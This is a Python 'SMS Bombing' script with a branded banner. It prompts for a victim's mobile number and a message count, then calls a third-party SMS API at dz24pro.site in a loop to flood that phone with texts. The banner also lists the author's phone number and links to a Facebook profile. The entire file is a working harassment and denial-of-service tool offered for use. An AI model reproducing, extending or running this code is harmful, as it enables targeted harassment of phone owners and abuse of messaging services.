import time
import os
import requests
import webbrowser

# Clear Screen
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

# Banner/Header
def banner():
    print("\033[0;92m____  _     _  _        ____  _     ____  _  __ _      ____")
    print("/  _ \/ \   / \/ \  /|  /   _\/ \ /|/  _ \/ |/ // \__/|/  _ \\")
    print("| / \|| |   | || |\ ||  |  /  | |_||| / \||   / | |\/||| / \|")
    print("| |-||| |_/\| || | \||  |  \__| | ||| |-|||   \ | |  ||| |-||")
    print("\_/ \|\____/\_/\_/  \|  \____/\_/ \|\_/ \|\_|\_\\_/  \|\_/ \|\033[0m")
    print("\033[0;95m╔══════════════════════════════════════════════════════╗")
    print("\033[0;95m║  \033[0;94m[1] \033[0;90mOWNER     : \033[0;92mALIN                              \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[2] \033[0;90mTEAM      : \033[0;92mALIN IS BRAND                    \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[3] \033[0;90mCONTACT   : \033[0;92m01575451054                       \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[4] \033[0;90mSERVICE   : \033[0;92mSMS Bombing                      \033[0;95m║")
    print("\033[0;95m║  \033[0;94m[5] \033[0;90mFACEBOOK  : \033[0;94mOpen Facebook Profile            \033[0;95m║")
    print("\033[0;95m╚══════════════════════════════════════════════════════╝\033[0m")

# SMS API Call
def send_sms(phone):
    url = f"http://dz24pro.site/api/sms.php?phone={phone}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"\033[0;92m[✓] SMS sent to {phone}")
        else:
            print(f"\033[0;91m[×] Failed to send SMS to {phone}")
    except Exception as e:
        print(f"\033[0;91m[×] Error: {e}")

# SMS Bombing Logic
def sms_bombing():
    number = input("\n📲 Enter Mobile Number: ")
    amount = int(input("🔢 Enter Amount of SMS: "))
    print("\n🚀 Bombing Started...\n")
    for i in range(amount):
        send_sms(number)
        time.sleep(1)

# Open Facebook Profile
def open_facebook():
    print("\n🌐 Opening Facebook profile...")
    fb_link = "https://www.facebook.com/profile.php?id=100001889177878"
    webbrowser.open(fb_link)

# Main Program
def main():
    clear()
    banner()
    option = input("\n📌 Enter Option [4 = SMS bombing, 5 = Open Facebook]: ")
    if option == "4":
        sms_bombing()
    elif option == "5":
        open_facebook()
    else:
        print("\n❌ Invalid option!")

# Run Script
if __name__ == "__main__":
    main()